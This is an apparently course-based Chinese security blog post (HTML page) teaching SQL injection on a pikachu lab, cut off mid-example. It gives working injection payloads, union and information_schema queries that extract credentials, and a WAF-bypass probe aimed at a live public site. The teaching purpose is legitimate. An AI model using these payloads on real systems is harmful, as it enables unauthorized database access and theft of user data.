<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>老男孩--Web十大常规漏洞(2) | GoldY</title><meta name="author" content="GoldY"><meta name="copyright" content="GoldY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="老男孩网络安全第二部分，OWASP TOP 10讲解。">
<meta property="og:type" content="article">
<meta property="og:title" content="老男孩--Web十大常规漏洞(2)">
<meta property="og:url" content="http://example.com/2025/05/12/oldboy2/index.html">
<meta property="og:site_name" content="GoldY">
<meta property="og:description" content="老男孩网络安全第二部分，OWASP TOP 10讲解。">
<meta property="og:locale" content="zn_CN">
<meta property="og:image" content="http://example.com/img/oldboy.jpg">
<meta property="article:published_time" content="2025-05-12T10:55:10.000Z">
<meta property="article:modified_time" content="2025-05-12T11:32:06.114Z">
<meta property="article:author" content="GoldY">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="老男孩安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/oldboy.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "老男孩--Web十大常规漏洞(2)",
  "url": "http://example.com/2025/05/12/oldboy2/",
  "image": "http://example.com/img/oldboy.jpg",
  "datePublished": "2025-05-12T10:55:10.000Z",
  "dateModified": "2025-05-12T11:32:06.114Z",
  "author": [
    {
      "@type": "Person",
      "name": "GoldY",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/05/12/oldboy2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '老男孩--Web十大常规漏洞(2)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bg2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/oldboy.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">GoldY</span></a><a class="nav-page-title" href="/"><span class="site-name">老男孩--Web十大常规漏洞(2)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">老男孩--Web十大常规漏洞(2)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-12T10:55:10.000Z" title="Created 2025-05-12 18:55:10">2025-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-12T11:32:06.114Z" title="Updated 2025-05-12 19:32:06">2025-05-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%80%81%E7%94%B7%E5%AD%A9%E5%AE%89%E5%85%A8/">老男孩安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">15.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>58mins</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="注入概念"><a href="#注入概念" class="headerlink" title="注入概念"></a>注入概念</h2><p><strong>1.1.1 什么是注入漏洞（SQL）</strong></p>
<p>​	接收相关参数未经过处理直接带入数据库查询操作</p>
<p>具备的两个关键点：</p>
<ul>
<li>用户能够控制输入（网站交互操作）</li>
<li>原本程序接受了用户输入的信息，并且直接执行（没有做过滤）</li>
</ul>
<p><strong>1.1.2 SQL注入漏洞的分类&#x2F;特点</strong></p>
<p>​	服务端漏洞（数据库服务-代码有逻辑问题）</p>
<p>​	与操作系统、数据库类型、脚本语言类型无关</p>
<p><strong>1.1.3 SQL漏洞产生原理</strong></p>
<p>​	代码中没有对用户的传入参数信息，做处理</p>
<p><strong>1.1.4 SQL注入的目的</strong></p>
<ul>
<li>窃取数据信息</li>
<li>修改数据信息</li>
<li>破坏数据信息</li>
</ul>
<p>1.1.5 SQL注入攻击流程：</p>
<ol>
<li>获取攻击网站域名（子域名）</li>
<li>获取攻击网站注入点</li>
<li>获取网站业务数据库名称</li>
<li>获取网站业务数据表名称</li>
<li>获取网站业务表字段信息</li>
<li>获取网站业务真实数据（SQL注入目的：窃取数据）<ol>
<li>利用联合注入获取数据信息（配合order by获取字段数）</li>
</ol>
</li>
<li>实现篡改或破坏数据 （堆叠注入）</li>
</ol>
<h2 id="漏洞点查找"><a href="#漏洞点查找" class="headerlink" title="漏洞点查找"></a>漏洞点查找</h2><p><strong>SQL漏洞点获取</strong></p>
<ul>
<li>登录的地方、更新的地方、注册的地方、留言板、查询、删除等</li>
<li>HTTP Header:<ul>
<li>UA：用户指纹信息 chrome – 加载到数据库<ul>
<li>UA指纹信息存储，可以用于判断是否存在盗号行为</li>
</ul>
</li>
<li>cookie：用户登录信息</li>
<li>referer：记录上一个页面的地址，常用于推广记录流量信息</li>
</ul>
</li>
<li>与数据库交互的相关页面<ul>
<li><a target="_blank" rel="noopener" href="http://www./*/*.com//*/*.asp?id=xx">http://www.\*\*.com/\*\*.asp?id=xx</a>	 (ASP注入)</li>
<li><a target="_blank" rel="noopener" href="http://www./*/*.com//*/*.php?id=xx">http://www.\*\*.com/\*\*.php?id=xx</a>	(PHP注入)</li>
<li><a target="_blank" rel="noopener" href="http://www./*/*.com//*/*.jsp?id=xx">http://www.\*\*.com/\*\*.jsp?id=xx</a>	  (JSP注入)</li>
</ul>
</li>
</ul>
<p>举例：pikachu靶场注册用户案例</p>
<p>访问：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_iu/sqli_reg.php#">Get the pikachu</a></p>
<ol>
<li>在提交注册前，进行请求包抓取</li>
<li>在burp suit中请求包发送到重发器</li>
<li>修改请求主体信息，加单引号</li>
<li>利用报错函数信息，获取数据库表名称</li>
</ol>
<p>	</p>
<p>伪静态如何实现SQL注入漏洞：</p>
<blockquote>
<p>伪静态：一般是中间件加载了伪静态插件代码，其实不是真正的静态页面</p>
</blockquote>
<p>伪静态例：</p>
<p>​	<a target="_blank" rel="noopener" href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p>
<p>&#x3D;&#x3D;&#x3D; <a target="_blank" rel="noopener" href="https://www.oldboyedu.com/zuixin_wenzhang/index?id=523">https://www.oldboyedu.com/zuixin_wenzhang/index?id=523</a></p>
<p>验证方式</p>
<p>​	<a target="_blank" rel="noopener" href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p>
<p>​	<a target="_blank" rel="noopener" href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523/%20/%26/%26/%20-1=-2">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523\%20\%26\%26\%20-1=-2</a></p>
<p>注意：该网站配置了WAF防火墙，需要通过URL编码的方式进行绕过，因为对and进行了过滤，即使用&amp;&amp;进行代替</p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>检测SQL漏洞</strong></p>
<p>根据有没有回显分为报错注入和盲注两种方式</p>
<h3 id="通过错误信息获取漏洞信息"><a href="#通过错误信息获取漏洞信息" class="headerlink" title="通过错误信息获取漏洞信息"></a>通过错误信息获取漏洞信息</h3><p>​	id&#x3D;1 and 1&#x3D;1	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;1 ;	—-成功-真</p>
<p>​	id&#x3D;1 and 1&#x3D;2	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;2 ;	—-失败-假</p>
<p>&#x3D;&#x3D;&#x3D;&gt; 执行结果不一致，存在漏洞（使用单引号也可以）</p>
<p>针对不同代码实现漏洞绕过：</p>
<ul>
<li>geekgold’ or 1&#x3D;1 – 	(针对asp代码的sql漏洞)</li>
<li>geekgold’ or 1&#x3D;1 #            (针对php代码的sql漏洞)</li>
</ul>
<p>规避SQL注入漏洞，需要对用户传入的信息做处理</p>
<h3 id="通过盲注的方式获取漏洞信息"><a href="#通过盲注的方式获取漏洞信息" class="headerlink" title="通过盲注的方式获取漏洞信息"></a>通过盲注的方式获取漏洞信息</h3><p><strong>1.3.2.1 基于布尔逻辑的盲注检测</strong></p>
<p>方法：通过构造布尔条件（如-1&#x3D;-1或-1&#x3D;-2）来观察浏览器的响应是否有变化</p>
<p>示例：		</p>
<ul>
<li>正常请求：<code>http://example.com/page?id=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND 1=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND 1=2</code></li>
</ul>
<p>结果：如果<code>1=1</code>时页面正常显示，而<code>1=2</code>时页面显示异常（如空白页面或错误信息），则可能存在盲注漏洞。</p>
<p><strong>1.3.2.2 基于时间函数的盲注检测</strong></p>
<p>方法：通过构造带有时间函数的SQL语句，观察浏览器的响应时间是否有变化</p>
<p>示例：</p>
<ul>
<li>正常请求：<code>http://example.com/page?id=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)</code></li>
</ul>
<p>结果：如果页面响应时间明显延迟（如5秒），则可能存在盲注漏洞。</p>
<h2 id="漏洞提交方式"><a href="#漏洞提交方式" class="headerlink" title="漏洞提交方式"></a>漏洞提交方式</h2><h3 id="GET-方式进行提交"><a href="#GET-方式进行提交" class="headerlink" title="GET 方式进行提交"></a>GET 方式进行提交</h3><p><strong>GET方式提交通常会在url后有参数赋值的信息</strong></p>
<p>典型页面： <a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php</a></p>
<p><img src="/img/oldboy/1-9.png"></p>
<p>通过bp进行抓包查看：</p>
<p>​	<img src="/img/oldboy/1-10.png"></p>
<p>漏洞验证：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+%5C%27+or+1%5C=1+%5C%23&submit=%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+\%27+or+1\%3D1+\%23&amp;submit=\%E6\%9F\%A5\%E8\%AF\%A2</a></p>
<h3 id="POST方式进行提交"><a href="#POST方式进行提交" class="headerlink" title="POST方式进行提交"></a>POST方式进行提交</h3><p><strong>POST方式进行提交：一般情况下用户输入的内容被隐藏起来了，地址栏看不到，需要借助抓包工具进行抓包</strong></p>
<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php</a></p>
<p><img src="/img/oldboy/1-12.png"></p>
<p>通过bp进行抓包查看：</p>
<p><img src="/img/oldboy/1-11.png"></p>
<p>验证漏洞：利用bp重发器（id&#x3D;2’&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2）修改请求主体信息</p>
<h3 id="Cookie方式进行提交"><a href="#Cookie方式进行提交" class="headerlink" title="Cookie方式进行提交"></a>Cookie方式进行提交</h3><p><strong>原理</strong></p>
<p>ASP脚本中的request对象，被用于从用户那里获取信息。</p>
<p>Request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</p>
<p>eg获取从表单中提交的数据时：request.form(“参数名称”)</p>
<p>ASP中规定也可以省略集合名称：request(“参数名称”)，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，可能存在Cookie注入</p>
<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php</a></p>
<p>在http请求头，cookie字段后面，添加SQL注入信息</p>
<p><img src="/img/oldboy/1-17.png"></p>
<h3 id="HEAD方式进行提交"><a href="#HEAD方式进行提交" class="headerlink" title="HEAD方式进行提交"></a>HEAD方式进行提交</h3><p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php</a></p>
<p><img src="/img/oldboy/1-14.png"></p>
<p>使用bp抓包</p>
<p><img src="/img/oldboy/1-13.png"></p>
<p>验证方式：通过Bp重发器，在UA后面加入’进行验证</p>
<p><img src="/img/oldboy/1-15.png"></p>
<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>传入数据库的信息是数值信息</p>
<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php</a></p>
<p> 交互原理：</p>
<p>   $id&#x3D;$_POST[‘id’];</p>
<p>   $query&#x3D;”select username,email from member where id&#x3D;$id”;<br>   id&#x3D;1<br>   select username,email from member where id&#x3D;1;<br>   利用漏洞：会将所有数据信息都展示出来<br>   id&#x3D;1 or 1&#x3D;1</p>
<h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><p>传入数据的信息是字符信息</p>
<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php</a></p>
<p>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select id,email from member where username&#x3D;’$name’”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;’xiaoq’<br>   利用漏洞：<br>   xiaoq’ or 1&#x3D;1 #</p>
<h3 id="搜索类型"><a href="#搜索类型" class="headerlink" title="搜索类型"></a>搜索类型</h3><p>  模糊匹配查询数据，传输数据库信息是任意字符信息</p>
<p>  典型页面：<a target="_blank" rel="noopener" href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php</a><br>  交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select username,id,email from member where username like ‘%$name%‘“;<br>   name&#x3D;xiaoq<br>   select username,id,email from member where username like ‘%xiaoq%‘</p>
<p>   利用漏洞： </p>
<p>   select username,id,email from member where username like ‘%xiaoq%‘ or 1&#x3D;1 #%‘</p>
<p>   xxx%‘ or 1&#x3D;1 #</p>
<h3 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h3><p> 精确匹配查询数据，传输数据库信息是任意字符信息，也称为XX型</p>
<p> 典型页面：<a target="_blank" rel="noopener" href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php</a><br>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select id,email from member where username&#x3D;(‘$name’)”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;(‘xiaoq’)<br>   利用漏洞：<br>   w’) or 1&#x3D;1 #</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union操作符用于合并两个或多个SQL语句指令信息，得到联合的查询结果；</p>
<p>使用示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#union all 不会进行重复值的过滤</span><br><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union all select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p>注意：当主查询语句和子查询语句中的字段个数不一致时，将会报错<br>select name,age,render from stu where name&#x3D;’zhangwu’ union all select name,age from teac where name&#x3D;’zhangwu’;<br>错误提示：The used SELECT statements have a different number of columns</p>
<p>解决方法思路：需要判断主查询语句的字段个数，通过order by 排序实现</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a\%&#x27;  order by 3 #</span><br><span class="line">    用户名中含有a\%&#x27; order by 3 #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">a\%&#x27;  order by 4 #</span><br><span class="line">	报错：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line">	</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#说明 主查询语句中字段数量为3</span></span></span><br></pre></td></tr></table></figure>



<p>知道字段数之后通过占位进行注入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a\%&#x27; union select username,email,version() from member #</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    用户名中含有a\%&#x27; union select username,email,version() from member #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：vince</span><br><span class="line">    uid:vince@pikachu.com</span><br><span class="line">    email is: 5.5.53</span><br><span class="line">	.................</span><br><span class="line"></span><br><span class="line">常用的函数：</span><br><span class="line">	USER();		VERSION();  	DATABASE();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>information_schema是MYSQL 5.0之后数据库中默认的数据库，此数据库中有数据库的元数据信息，包含了一些数据库统计信息（有哪些库、表、字段、数据存储量、应用索引数量）</p>
<p>典型页面：<a target="_blank" rel="noopener" href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p><strong>应用方式</strong></p>
<ol>
<li>获取数据库的库名<ol>
<li>vince’ union select database(),user(),3#%</li>
</ol>
</li>
<li>获取数据库的表名<ol>
<li>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema&#x3D;’pikachu’#</li>
</ol>
</li>
<li>获取数据库表中的字段<ol>
<li>k’ union select table_name,column_name,3 from information_schema.columns where table_name&#x3D;’user’#%</li>
</ol>
</li>
<li>获取数据库的数据<ol>
<li>kobe’union select username ,password,3 from users#%</li>
</ol>
</li>
</ol>
<p>常规方法应用步骤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span>、获取所有数据库表明</span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span>、获取当前数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、获取指定表的列名</span><br><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">#<span class="number">4</span>、获取所有数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES;</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、获取所有数据库的列名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME, 